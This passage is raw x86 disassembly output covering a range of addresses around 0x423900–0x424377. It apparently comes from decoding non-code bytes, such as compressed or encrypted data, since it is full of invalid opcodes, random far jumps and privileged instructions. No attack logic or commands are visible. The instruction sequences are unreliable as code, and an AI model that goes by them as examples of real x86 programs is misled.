  4238f7:	outs   dx,BYTE PTR gs:[esi]
  4238f9:	pop    ebp
  4238fa:	xchg   ebp,eax
  4238fb:	sti    
  4238fc:	test   bl,ah
  4238fe:	dec    esi
  4238ff:	stos   BYTE PTR es:[edi],al
  423900:	test   DWORD PTR [ecx],ebp
  423902:	std    
  423903:	addr16 (bad) 
  423905:	cmp    bh,BYTE PTR [ecx+0x71]
  423908:	xchg   ecx,eax
  423909:	sti    
  42390a:	push   esi
  42390b:	loope  0x423950
  42390d:	and    dh,BYTE PTR [edi]
  42390f:	fadd   QWORD PTR [eax]
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x2efa2bbd
  423982:	popf   
  423983:	xor    al,0x78
  423985:	jnp    0x423988
  423987:	add    BYTE PTR [ecx+eax*1],al
  42398a:	add    BYTE PTR [eax],al
  42398c:	or     cl,BYTE PTR [edi+0x747ac099]
  423992:	rcr    BYTE PTR ds:0x15ceb577,1
  423998:	jne    0x423940
  42399a:	data16 clc 
  42399c:	out    dx,eax
  42399d:	inc    edi
  42399e:	mov    eax,?
  4239a0:	mov    ecx,0xdfbb2683
  4239a5:	data16 mov bl,0x5f
  4239a8:	xor    al,0xc4
  4239aa:	push   esi
  4239ab:	(bad)  
  4239ac:	loopne 0x423999
  4239ae:	cmp    al,0xdd
  4239b0:	mov    esi,0x5614e30c
  4239b5:	or     ebp,0xffffff8b
  4239b8:	push   esp
  4239b9:	jbe    0x42393d
  4239bb:	adc    DWORD PTR [ecx-0x284622bf],ebp
  4239c1:	xchg   edi,eax
  4239c2:	fcmovb st,st(4)
  4239c4:	aam    0x70
  4239c6:	add    ah,bh
  4239c8:	dec    edx
  4239c9:	sbb    ch,BYTE PTR [ecx]
  4239cb:	ret    0x5d62
  4239ce:	stc    
  4239cf:	pushf  
  4239d0:	scas   eax,DWORD PTR es:[edi]
  4239d1:	or     edi,eax
  4239d3:	push   0x20
  4239d5:	cmp    ebp,DWORD PTR [eax+0x5d]
  4239d8:	jmp    0x714d:0xe186934c
  4239df:	jl     0x4239d7
  4239e1:	jp     0x4239b2
  4239e3:	loope  0x423a13
  4239e5:	and    dh,BYTE PTR [esi+eiz*1-0x7a0eb2a0]
  4239ec:	sbb    DWORD PTR [ebx],ebp
  4239ee:	nop
  4239ef:	sbb    ebx,DWORD PTR ds:0x3d61fe18
  4239f5:	fiadd  WORD PTR [eax]
  4239f7:	call   0x1a1e9f4e
  4239fc:	xor    edx,DWORD PTR [ebx-0x7009b492]
  423a02:	rcl    BYTE PTR [ecx+0x23],1
  423a05:	push   ebp
  423a06:	(bad)  
  423a07:	jae    0x4239d1
  423a09:	jge    0x423a3e
  423a0b:	or     eax,0xa88c3a98
  423a10:	inc    edi
  423a11:	and    edx,DWORD PTR [edi]
  423a13:	scas   eax,DWORD PTR es:[edi]
  423a14:	push   edx
  423a15:	and    eax,DWORD PTR [edi-0x6b]
  423a18:	(bad)  
  423a19:	sub    eax,0xed972b68
  423a1e:	jmp    0x423a16
  423a20:	inc    edx
  423a21:	sahf   
  423a22:	xchg   esp,eax
  423a23:	ja     0x423a98
  423a25:	cmp    BYTE PTR [eax+ebp*1],0xc1
  423a29:	fist   DWORD PTR [esp+eiz*4]
  423a2c:	jbe    0x423a47
  423a2e:	imul   ebp,esi,0x79
  423a31:	dec    edi
  423a32:	div    BYTE PTR [esi+0x5c]
  423a35:	pop    ebx
  423a36:	fwait
  423a37:	out    0xff,al
  423a39:	jae    0x423a5a
  423a3b:	jbe    0x423a48
  423a3d:	push   ds
  423a3e:	or     al,0xb4
  423a40:	jge    0x423ab0
  423a42:	into   
  423a43:	mov    cl,0x35
  423a45:	data16 es hlt 
  423a48:	mov    cl,0x24
  423a4a:	mov    al,ds:0x1a2b6386
  423a4f:	pop    es
  423a50:	inc    esp
  423a51:	pop    ss
  423a52:	mov    DWORD PTR [edx+0x53],esp
  423a55:	xchg   ebp,eax
  423a56:	sbb    DWORD PTR [edi],0xffffff99
  423a59:	sbb    BYTE PTR [ebp-0x15],0x98
  423a5d:	jbe    0x423ad9
  423a5f:	sbb    al,bl
  423a61:	stos   DWORD PTR es:[edi],eax
  423a62:	sar    DWORD PTR [eax-0x1b],0x75
  423a66:	ins    BYTE PTR es:[edi],dx
  423a67:	push   eax
  423a68:	sbb    al,0x51
  423a6a:	enter  0x3922,0xb0
  423a6e:	mov    edi,0x5a9eec58
  423a73:	mov    esp,0xa00c3d7c
  423a78:	js     0x423a63
  423a7a:	arpl   WORD PTR [ebp-0x6c],sp
  423a7d:	xor    BYTE PTR [ebp+0x21355cff],0xdc
  423a84:	fidiv  DWORD PTR [ecx-0x3f84816f]
  423a8a:	ret    0x8ada
  423a8d:	inc    esp
  423a8e:	xor    eax,0x56
	...
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	stos   BYTE PTR es:[edi],al
  423b01:	xor    bh,BYTE PTR [ebx]
  423b03:	lods   al,BYTE PTR ds:[esi]
  423b04:	jl     0x423b82
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    al,0x1
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	or     al,0x49
  423b0e:	mov    dh,0x11
  423b10:	sbb    DWORD PTR [ecx+eax*1+0x4d],esi
  423b14:	and    bh,cl
  423b16:	icebp  
  423b17:	icebp  
  423b18:	cdq    
  423b19:	cmp    DWORD PTR [eax],0x67
  423b1c:	jo     0x423ab5
  423b1e:	test   BYTE PTR [ebp+0x6fe158e2],dh
  423b24:	push   ebp
  423b25:	call   0x876034be
  423b2a:	stos   DWORD PTR es:[edi],eax
  423b2b:	aaa    
  423b2c:	js     0x423ac9
  423b2e:	jne    0x423b90
  423b30:	ds stos DWORD PTR es:[edi],eax
  423b32:	mov    al,0x1a
  423b34:	pop    ds
  423b35:	jae    0x423b7c
  423b37:	adc    DWORD PTR [edi-0x5b],esp
  423b3a:	xchg   BYTE PTR [ebp+edx*4+0x6c334b9c],bh
  423b41:	rcr    bl,cl
  423b43:	inc    ebp
  423b44:	test   DWORD PTR [bx+di],ebp
  423b47:	xchg   ebp,eax
  423b48:	jno    0x423adf
  423b4a:	xchg   edi,eax
  423b4b:	or     ah,BYTE PTR [ecx-0x19]
  423b4e:	adc    BYTE PTR [ecx],bl
  423b50:	sub    cl,BYTE PTR [ebx]
  423b52:	ja     0x423af0
  423b54:	fwait
  423b55:	push   cs
  423b56:	sub    ecx,ebx
  423b58:	sti    
  423b59:	inc    esp
  423b5a:	shl    ecx,1
  423b5c:	in     eax,0x6b
  423b5e:	adc    DWORD PTR [ecx+0x4fa33190],ecx
  423b64:	fild   DWORD PTR [edx+ebx*8-0x64809a37]
  423b6b:	pop    ecx
  423b6c:	mov    ds:0xebb726ae,al
  423b71:	mov    eax,ds:0xa4100817
  423b76:	jb     0x423b68
  423b78:	xor    al,0x6
  423b7a:	xlat   BYTE PTR ds:[ebx]
  423b7b:	mov    ecx,0xaf79262c
  423b80:	mov    bh,0x6e
  423b82:	test   al,0xa0
  423b84:	cld    
  423b85:	push   ebx
  423b86:	xchg   BYTE PTR [eax-0x3648bca1],bl
  423b8c:	adc    eax,0x757d34d8
  423b91:	cs xchg bl,cl
  423b94:	(bad)  
  423b95:	call   eax
  423b97:	mov    esp,0x8a97ae24
  423b9c:	inc    ebx
  423b9d:	or     bl,BYTE PTR [ecx+0x42]
  423ba0:	mov    DWORD PTR [eax+0x3c384e07],esp
  423ba6:	repz shrd DWORD PTR [ecx-0xa0ce179],esp,0xb0
  423baf:	push   esi
  423bb0:	(bad)  
  423bb1:	sub    bl,ah
  423bb3:	mov    DWORD PTR [eax+0x39],edx
  423bb6:	fisttp WORD PTR ds:0x5a5fd5d7
  423bbc:	push   edi
  423bbd:	iret   
  423bbe:	je     0x423c04
  423bc0:	or     DWORD PTR [ecx+0x11],eax
  423bc3:	cmp    DWORD PTR [edi-0x5e],ebx
  423bc6:	sbb    bl,bl
  423bc8:	adc    bl,BYTE PTR [eax+0x2628e9ed]
  423bce:	push   0xffffffb4
  423bd0:	mov    BYTE PTR [eax],dl
  423bd2:	das    
  423bd3:	inc    ebp
  423bd4:	fdivr  DWORD PTR [edx]
  423bd6:	ins    BYTE PTR es:[edi],dx
  423bd7:	scas   eax,DWORD PTR es:[edi]
  423bd8:	pop    ebx
  423bd9:	call   0xacfc:0xa0789671
  423be0:	jns    0x423c32
  423be2:	repnz or ebp,edi
  423be5:	push   ds
  423be6:	xchg   ebp,eax
  423be7:	push   ss
  423be8:	or     BYTE PTR [ebx-0x63336468],bh
  423bee:	xor    edi,DWORD PTR [ebp+0x6a]
  423bf1:	sbb    DWORD PTR [esi+0x23],edi
  423bf4:	jge    0x423c04
  423bf6:	mov    DWORD PTR [edi+0x619dfc96],eax
  423bfc:	scas   al,BYTE PTR es:[edi]
  423bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bfe:	jle    0x423c2d
  423c00:	hlt    
  423c01:	and    edi,DWORD PTR [ebp+eax*1+0x51]
  423c05:	xlat   BYTE PTR ds:[ebx]
  423c06:	mov    edx,0xe54651f8
  423c0b:	dec    edi
  423c0c:	pushf  
  423c0d:	test   BYTE PTR [edx+edx*4],bh
	...
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x69bb99e9]
  423c81:	xor    edi,esi
  423c83:	loop   0x423c05
  423c85:	jge    0x423c88
  423c87:	add    BYTE PTR [ecx+eax*1],al
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	mov    bh,0x4e
  423c8e:	lods   al,BYTE PTR ds:[esi]
  423c8f:	jl     0x423cb6
  423c91:	das    
  423c92:	cmp    BYTE PTR [ebp-0xb780279],bh
  423c98:	retf   
  423c99:	jg     0x423c5b
  423c9b:	call   0x8171c628
  423ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ca1:	xlat   BYTE PTR ds:[ebx]
  423ca2:	or     esi,DWORD PTR ds:[esi]
  423ca5:	xchg   esi,eax
  423ca6:	push   esp
  423ca7:	sbb    al,0x19
  423ca9:	pop    ecx
  423caa:	cmc    
  423cab:	sub    esp,DWORD PTR [ebx]
  423cad:	aam    0x46
  423caf:	dec    eax
  423cb0:	mov    eax,0xf79e0065
  423cb5:	jmp    0x817f:0x1be4ee6b
  423cbc:	leave  
  423cbd:	mov    ds:0xcb471987,al
  423cc2:	sub    DWORD PTR [edx],ebp
  423cc4:	inc    esp
  423cc5:	repz pop es
  423cc7:	test   eax,0xf01d1631
  423ccc:	(bad)  
  423ccd:	dec    edx
  423cce:	gs sbb ch,bh
  423cd1:	fmul   DWORD PTR [ecx-0x13]
  423cd4:	pop    edx
  423cd5:	pushf  
  423cd6:	scas   al,BYTE PTR es:[edi]
  423cd7:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cd9:	cmp    BYTE PTR [edx+0x3826ca77],al
  423cdf:	and    BYTE PTR [edi+0x78],cl
  423ce2:	xchg   edx,eax
  423ce3:	mul    BYTE PTR [edi]
  423ce5:	js     0x423ca6
  423ce7:	adc    ch,BYTE PTR [esi-0x55]
  423cea:	lods   eax,DWORD PTR gs:[esi]
  423cec:	sahf   
  423ced:	push   0x2a
  423cef:	and    al,0xa9
  423cf1:	js     0x423c94
  423cf3:	(bad)
  423cf6:	test   eax,0x6f179941
  423cfb:	fiadd  WORD PTR [edx-0x228560d0]
  423d01:	push   ebp
  423d02:	out    0x1c,eax
  423d04:	push   esi
  423d05:	mov    al,ds:0xce7f8a69
  423d0a:	mov    cl,0x36
  423d0c:	cs (bad) 
  423d0f:	enter  0x4339,0xa7
  423d13:	loop   0x423d31
  423d15:	stos   DWORD PTR es:[edi],eax
  423d16:	shl    BYTE PTR fs:[ebp+eiz*8+0x173efbf3],1
  423d1e:	lods   al,BYTE PTR ds:[esi]
  423d1f:	cmp    al,0x6a
  423d21:	dec    DWORD PTR [edx+0x35ab13f]
  423d27:	jp     0x423d85
  423d29:	shl    dh,1
  423d2b:	sti    
  423d2c:	xchg   DWORD PTR [ebp-0x436df133],eax
  423d32:	(bad)  [ebx-0x1f]
  423d35:	outs   dx,BYTE PTR ds:[esi]
  423d36:	add    al,0xb0
  423d38:	repz xchg edi,eax
  423d3a:	jb     0x423d06
  423d3c:	(bad)  [ecx]
  423d3e:	pop    edx
  423d3f:	mov    ecx,0xbe159cba
  423d44:	jmp    0x4af6:0x639d85f7
  423d4b:	jmp    0xf28f:0xb3efc264
  423d52:	or     edx,eax
  423d54:	ret    0x8644
  423d57:	fsubr  DWORD PTR [edi]
  423d59:	dec    ecx
  423d5a:	mov    edx,0x2eda5c0c
  423d5f:	xchg   esp,eax
  423d60:	cdq    
  423d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d62:	add    eax,0x34139726
  423d67:	xchg   esi,eax
  423d68:	outs   dx,BYTE PTR ds:[esi]
  423d69:	inc    ebx
  423d6a:	xchg   ebx,eax
  423d6b:	sbb    BYTE PTR [edi],0x95
  423d6e:	lds    ebx,FWORD PTR [ecx-0x733ad615]
  423d74:	lock neg BYTE PTR [edi-0x7e9afe61]
  423d7b:	repz rcl DWORD PTR [ebx+0x306ba097],0xbb
  423d83:	dec    eax
  423d84:	dec    ebx
  423d85:	ret    
  423d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d87:	mov    al,0x93
  423d89:	inc    ebx
  423d8a:	loope  0x423d0d
  423d8c:	and    DWORD PTR [edi+0xe4c1],eax
	...
  423df2:	add    BYTE PTR [eax],al
  423df4:	(bad)  
  423df5:	test   BYTE PTR [edi-0x118668f7],0xff
  423dfc:	daa    
  423dfd:	mov    DWORD PTR [eax+0x60a225d2],esp
  423e03:	cmp    eax,0x17e84
  423e08:	add    al,0x1
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	retf   
  423e0d:	jb     0x423e3b
  423e0f:	xor    ebx,esp
  423e11:	test   al,0x15
  423e13:	lahf   
  423e14:	cmp    al,0xaf
  423e16:	fcomp  DWORD PTR [ebp-0x38f8664e]
  423e1c:	lahf   
  423e1d:	xchg   esp,eax
  423e1e:	add    ebp,DWORD PTR [eax]
  423e20:	push   ds
  423e21:	jae    0x423e84
  423e23:	icebp  
  423e24:	or     al,0xc3
  423e26:	xchg   ecx,eax
  423e27:	jg     0x423ea1
  423e29:	leave  
  423e2a:	push   esp
  423e2b:	and    BYTE PTR [edi-0x74b30332],0xbe
  423e32:	dec    eax
  423e33:	(bad)  
  423e36:	fisubr DWORD PTR [ecx]
  423e38:	pop    esp
  423e39:	ss inc edx
  423e3b:	js     0x423e8a
  423e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e3e:	sub    BYTE PTR [edx+0x75f4d97f],al
  423e44:	lods   al,BYTE PTR ds:[esi]
  423e45:	jb     0x423e92
  423e47:	cwde   
  423e48:	push   eax
  423e49:	rcr    DWORD PTR [ebp-0x2c],cl
  423e4c:	jecxz  0x423e71
  423e4e:	inc    esp
  423e4f:	loopne 0x423df1
  423e51:	popa   
  423e52:	sbb    DWORD PTR [edx+0x706a1283],eax
  423e58:	xchg   ebx,eax
  423e59:	jo     0x423e68
  423e5b:	fs inc eax
  423e5d:	adc    DWORD PTR ds:0x141d27e7,esp
  423e63:	lea    edi,[esi]
  423e65:	push   eax
  423e66:	mov    edx,ecx
  423e68:	mov    ds:0x5b2e4c94,eax
  423e6d:	ds push cs
  423e6f:	push   edi
  423e70:	mov    cl,0x57
  423e72:	mov    BYTE PTR [edx-0x79b64f30],cl
  423e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e79:	jb     0x423e24
  423e7b:	add    al,0x5b
  423e7d:	dec    eax
  423e7e:	push   cs
  423e7f:	cmp    al,0x34
  423e81:	pushf  
  423e82:	jg     0x423eab
  423e84:	data16 fisubr WORD PTR es:[eax+0x57]
  423e89:	inc    ecx
  423e8a:	dec    edx
  423e8b:	mov    cl,0x11
  423e8d:	je     0x423f05
  423e8f:	test   esi,edx
  423e91:	adc    eax,DWORD PTR [ecx-0x722cf336]
  423e97:	pop    ecx
  423e98:	push   ds
  423e99:	test   eax,0x930b2246
  423e9e:	inc    DWORD PTR [bx+si]
  423ea1:	repnz aas 
  423ea3:	jmp    0xc08f46cf
  423ea8:	adc    cl,bl
  423eaa:	addr16 pop ebp
  423eac:	and    al,0xd8
  423eae:	out    0xb4,eax
  423eb0:	jmp    0x21b58671
  423eb5:	or     ebx,DWORD PTR [ecx]
  423eb7:	call   0x2d6:0xc868118
  423ebe:	sub    edx,esp
  423ec0:	inc    esi
  423ec1:	mov    edi,0x4802464c
  423ec6:	mov    ch,0x2e
  423ec8:	adc    bh,dl
  423eca:	xchg   esi,eax
  423ecb:	and    ebp,esp
  423ecd:	icebp  
  423ece:	pop    edx
  423ecf:	inc    eax
  423ed0:	mov    ds:0x7b381d82,al
  423ed5:	and    DWORD PTR [esi+ecx*2-0x52],edx
  423ed9:	aad    0x5a
  423edb:	gs lock xchg esi,eax
  423ede:	clc    
  423edf:	mov    ds:0x83016bc1,al
  423ee4:	inc    ebp
  423ee5:	ret    0x31a5
  423ee8:	lock sar DWORD PTR gs:[edx-0x1d2c9f8b],0x6
  423ef1:	into   
  423ef2:	push   0xffffff8a
  423ef4:	data16 and BYTE PTR [edi+0x51],bl
  423ef8:	add    al,0x89
  423efa:	shr    DWORD PTR [edi-0x603ec9b2],1
  423f00:	mov    dl,0x6
  423f02:	inc    eax
  423f03:	clc    
  423f04:	xchg   edx,eax
  423f05:	pusha  
  423f06:	sub    DWORD PTR [esi],ebp
  423f08:	mov    es,WORD PTR [ecx+0x2461078e]
  423f0e:	push   edi
  423f0f:	sub    DWORD PTR [eax],eax
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	repz mov ebp,ebp
  423f83:	xchg   DWORD PTR [eax+0x400017f],ecx
  423f89:	add    DWORD PTR [eax],eax
  423f8b:	add    BYTE PTR [ebp-0x1d224e0c],ch
  423f91:	(bad)
  423f94:	ins    BYTE PTR es:[edi],dx
  423f95:	fs sub eax,0x1ed7a1b9
  423f9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f9c:	add    BYTE PTR [ecx+0x11],al
  423f9f:	inc    eax
  423fa0:	mov    ah,0x69
  423fa2:	mov    ecx,0x7ac848d
  423fa7:	rcl    BYTE PTR [eax],0x30
  423faa:	xchg   DWORD PTR [eax+edx*8+0x4a],esp
  423fae:	push   ds
  423faf:	psllq  mm3,mm7
  423fb2:	mov    ds:0x8ba1c66e,eax
  423fb7:	mov    DWORD PTR [eax+eiz*2+0xe],edi
  423fbb:	leave  
  423fbc:	xchg   edx,eax
  423fbd:	call   0xafe3a77c
  423fc2:	frstor [ecx-0x318d01ad]
  423fc8:	xor    al,0xe6
  423fca:	fimul  DWORD PTR [ecx]
  423fcc:	and    bl,BYTE PTR [esp+ebp*8+0xfee2e50]
  423fd3:	lahf   
  423fd4:	out    0xcc,al
  423fd6:	xchg   ebx,eax
  423fd7:	mov    dh,0x6e
  423fd9:	test   al,0x7c
  423fdb:	inc    ebx
  423fdc:	sub    al,0x88
  423fde:	ret    0xd818
  423fe1:	xor    BYTE PTR [ebp+0x4b],bh
  423fe4:	rcr    DWORD PTR [ecx-0x7954431b],cl
  423fea:	in     eax,0xaf
  423fec:	out    dx,al
  423fed:	inc    ebp
  423fee:	pop    edi
  423fef:	(bad)  
  423ff0:	and    cl,BYTE PTR ds:0xe47c3ff
  423ff6:	fcmovnbe st,st(2)
  423ff8:	pop    edx
  423ff9:	out    0xa6,al
  423ffb:	sar    BYTE PTR [eax+0x79817c46],0x86
  424002:	inc    ebx
  424003:	dec    edx
  424004:	mov    ds:0x7d0fbe63,al
  424009:	cmp    dl,BYTE PTR [edi+0x632fc167]
  42400f:	mov    DWORD PTR [esi+0x6],ebp
  424012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424013:	(bad)  
  424014:	xor    bh,BYTE PTR [esi-0x30]
  424017:	aad    0x4e
  424019:	in     eax,0x0
  42401b:	sub    dh,dh
  42401d:	fsubr  QWORD PTR [edi]
  42401f:	mov    WORD PTR [edi+0x123b970b],?
  424025:	xchg   ebx,eax
  424026:	sbb    al,0xf9
  424028:	adc    DWORD PTR gs:0x135d0093,eax
  42402f:	pusha  
  424030:	cmp    eax,0x79ae0950
  424035:	jbe    0x424084
  424037:	xchg   esp,eax
  424038:	es daa 
  42403a:	push   cs
  42403b:	inc    DWORD PTR [edi+ecx*2+0x2f]
  42403f:	gs cmp eax,0x304e483f
  424045:	(bad)  [edi+0x1e]
  424048:	xlat   BYTE PTR ds:[ebx]
  424049:	cmp    DWORD PTR [ecx+0xc],0xb64e91f3
  424050:	imul   edi
  424052:	repnz inc esi
  424054:	sub    eax,0x9babd0be
  424059:	adc    eax,esi
  42405b:	inc    ebp
  42405c:	jno    0x424033
  42405e:	aam    0xb9
  424060:	inc    ecx
  424061:	inc    esp
  424062:	(bad)  
  424063:	sbb    eax,0xa64a7e5
  424068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424069:	or     DWORD PTR [ebx+0x35],ebx
  42406c:	and    al,0xdf
  42406e:	xor    eax,0xe876dc
  424073:	clc    
  424074:	push   edx
  424075:	outs   dx,DWORD PTR ds:[esi]
  424076:	mov    DWORD PTR [edi-0x48e1e157],ecx
  42407c:	mov    ah,0x6c
  42407e:	loop   0x4240e5
  424080:	leave  
  424081:	mov    eax,0xf488fe61
  424086:	add    DWORD PTR [esi+esi*8],edi
  424089:	or     DWORD PTR [esi-0x75],esp
  42408c:	adc    al,0x4
  42408e:	cs pop ebx
	...
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	sbb    edi,DWORD PTR [ebx+edx*2]
  424103:	push   esp
  424104:	mov    WORD PTR [eax+0x1040001],es
  42410a:	add    BYTE PTR [eax],al
  42410c:	mov    ds:0xed1644d2,eax
  424111:	aad    0xff
  424113:	pop    es
  424114:	pop    ecx
  424115:	mov    ebx,0xa7e54561
  42411a:	outs   dx,BYTE PTR ds:[esi]
  42411b:	sub    DWORD PTR [eax-0x40f27391],edi
  424121:	les    edx,FWORD PTR [eax]
  424123:	jmp    0x66e8:0xb87af435
  42412a:	xchg   esp,eax
  42412b:	push   esp
  42412c:	scas   eax,DWORD PTR es:[edi]
  42412d:	xchg   esi,eax
  42412e:	ds jo  0x424152
  424131:	cwde   
  424132:	and    DWORD PTR [edx-0x7d],edi
  424135:	mov    ecx,0x4257c569
  42413a:	imul   eax,DWORD PTR [edx-0x72a291f4],0xffffff99
  424141:	and    ch,dh
  424143:	out    dx,eax
  424144:	(bad)
  424147:	mov    eax,ds:0x22a392bc
  42414c:	or     DWORD PTR [eax+ecx*8],eax
  42414f:	sti    
  424150:	inc    ebx
  424151:	cwde   
  424152:	(bad)  
  424153:	(bad)  
  424154:	leave  
  424155:	popa   
  424156:	int    0x70
  424158:	xchg   esp,eax
  424159:	test   eax,0xd638a1d9
  42415e:	leave  
  42415f:	jne    0x424142
  424161:	xor    DWORD PTR [esi*8-0x66471860],eax
  424168:	scas   al,BYTE PTR es:[edi]
  424169:	mov    ebx,0x97db64f1
  42416e:	(bad)  
  42416f:	xchg   esp,eax
  424170:	retf   0x7914
  424173:	fistp  DWORD PTR [eax+0xc]
  424176:	scas   al,BYTE PTR es:[edi]
  424177:	rcr    BYTE PTR ds:0x9847ec7c,cl
  42417d:	mov    bh,0xa9
  42417f:	test   DWORD PTR [ecx-0x20acdb56],0x5a22793f
  424189:	push   esp
  42418a:	xor    al,0xad
  42418c:	push   0xe5b1e17f
  424191:	pop    esp
  424192:	inc    edi
  424193:	int    0x48
  424195:	mov    eax,0x30667fb4
  42419a:	pushf  
  42419b:	loope  0x42419d
  42419d:	pop    ss
  42419e:	stos   BYTE PTR es:[edi],al
  42419f:	mov    WORD PTR [ecx],cs
  4241a1:	test   BYTE PTR [edi+eax*1+0x35],bl
  4241a5:	stos   BYTE PTR es:[edi],al
  4241a6:	mov    al,BYTE PTR [esp+eax*2+0x34]
  4241aa:	pop    edx
  4241ab:	(bad)  
  4241ac:	mov    dh,0xb8
  4241ae:	sub    BYTE PTR [edx],bh
  4241b0:	inc    eax
  4241b1:	xor    DWORD PTR [ecx+0x2ed0618e],esi
  4241b7:	or     eax,0xf742f62d
  4241bc:	sub    DWORD PTR [edx+eax*1-0x3f],edx
  4241c0:	test   ebx,edi
  4241c2:	ins    BYTE PTR es:[edi],dx
  4241c3:	push   0x6e
  4241c5:	lea    esp,[edi+edi*4]
  4241c8:	push   ecx
  4241c9:	ror    BYTE PTR [ebx-0x22b560f2],cl
  4241cf:	cdq    
  4241d0:	and    al,0x93
  4241d2:	in     eax,0x4f
  4241d4:	stos   BYTE PTR es:[edi],al
  4241d5:	jmp    0x424167
  4241d7:	push   eax
  4241d8:	icebp  
  4241d9:	out    0x42,eax
  4241db:	test   eax,0xb59726fd
  4241e0:	cmp    BYTE PTR ds:0xb7998e4e,dh
  4241e6:	jb     0x424254
  4241e8:	pop    eax
  4241e9:	fst    QWORD PTR [edi-0x4]
  4241ec:	(bad)  
  4241ed:	fdivr  QWORD PTR [ecx]
  4241ef:	ins    DWORD PTR es:[edi],dx
  4241f0:	dec    eax
  4241f1:	adc    al,0xc6
  4241f3:	call   0x5463:0x6057c4a9
  4241fa:	mov    ch,0x28
  4241fc:	cwde   
  4241fd:	lock and al,0x9b
  424200:	sar    edx,cl
  424202:	jmp    0xbb93:0x7305c68d
  424209:	adc    DWORD PTR [ebp+0x35],ebp
  42420c:	cdq    
  42420d:	sbb    eax,0x5cef
	...
  424272:	add    BYTE PTR [eax],al
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	daa    
  424281:	xchg   ebp,eax
  424282:	data16 seto BYTE PTR [ecx+0x1040001]
  42428a:	add    BYTE PTR [eax],al
  42428c:	dec    ebp
  42428d:	shl    bh,0x91
  424290:	(bad)  
  424291:	repz add DWORD PTR [ebx-0x701af86f],0x1b
  424299:	adc    esi,DWORD PTR [eax+esi*4+0x6ebf4ecf]
  4242a0:	es jno 0x4242d4
  4242a3:	lock mov ch,BYTE PTR [edi]
  4242a6:	sub    al,0xe9
  4242a8:	jecxz  0x42431f
  4242aa:	loope  0x4242f6
  4242ac:	or     dl,cl
  4242ae:	inc    esp
  4242af:	push   es
  4242b0:	les    eax,FWORD PTR [eax+0x4f]
  4242b3:	loope  0x424313
  4242b5:	sbb    esi,DWORD PTR [ebp-0x5764bc1a]
  4242bb:	mov    BYTE PTR [bx+di-0x35],cl
  4242bf:	stos   BYTE PTR es:[edi],al
  4242c0:	pop    edi
  4242c1:	mov    esi,es
  4242c3:	mov    eax,0x3542c9e5
  4242c8:	mov    bl,0xe3
  4242ca:	cmp    dl,BYTE PTR [edx+0x62ed3ffb]
  4242d0:	mov    ah,0x54
  4242d2:	std    
  4242d3:	dec    ebx
  4242d4:	leave  
  4242d5:	sbb    al,0x52
  4242d7:	push   0x71
  4242d9:	push   ss
  4242da:	out    0x9e,eax
  4242dc:	mov    ds:0xef73c443,al
  4242e1:	mov    ebp,0x556db334
  4242e6:	pop    esp
  4242e7:	mov    al,dl
  4242e9:	rol    edi,cl
  4242eb:	pop    esp
  4242ec:	in     eax,0x20
  4242ee:	dec    ebp
  4242ef:	jbe    0x42433a
  4242f1:	push   ebx
  4242f2:	test   al,0x13
  4242f4:	mov    bh,0xd8
  4242f6:	xchg   edi,eax
  4242f7:	ins    DWORD PTR es:[edi],dx
  4242f8:	mov    al,0x78
  4242fa:	and    ah,BYTE PTR [esi-0x314201f3]
  424300:	jb     0x424356
  424302:	shl    edx,cl
  424304:	adc    edx,DWORD PTR [edi-0x49cc358e]
  42430a:	clc    
  42430b:	cld    
  42430c:	mov    ah,0x97
  42430e:	xchg   ecx,eax
  42430f:	mov    DWORD PTR [ebx+0x5f],eax
  424312:	jle    0x4242ff
  424314:	pushf  
  424315:	sbb    ah,BYTE PTR [esi+0xe0e9dd8]
  42431b:	int3   
  42431c:	retf   
  42431d:	ret    0x873f
  424320:	fldcw  WORD PTR [eax+eax*8]
  424323:	inc    ebx
  424324:	inc    esp
  424325:	call   0x665f0ab
  42432a:	and    BYTE PTR [edx-0x24b7177d],cl
  424330:	(bad)
  424334:	sbb    al,0x68
  424336:	adc    DWORD PTR [esi],ebx
  424338:	add    bh,BYTE PTR [ecx]
  42433a:	and    DWORD PTR [esi-0xc],ebp
  42433d:	leave  
  42433e:	mov    edx,0xfda4f4b5
  424343:	pop    ecx
  424344:	mov    DWORD PTR [edi*8-0x1c5ad0b0],0x758582f5
  42434f:	push   esp
  424350:	jmp    DWORD PTR [eax]
  424352:	lock or esp,0xa523f497
  424359:	daa    
  42435a:	mov    ds:0xa54b126a,al
  42435f:	sbb    BYTE PTR [ebx+0x7eef0a86],0x8d
  424366:	add    ch,BYTE PTR [ebp-0x2e75c1ac]
  42436c:	nop
  42436d:	retf   
  42436e:	imul   esp,ecx,0x35d9275e
  424374:	aam    0xf5
  424376:	dec    esp
  424377:	fs or  ebx,esp
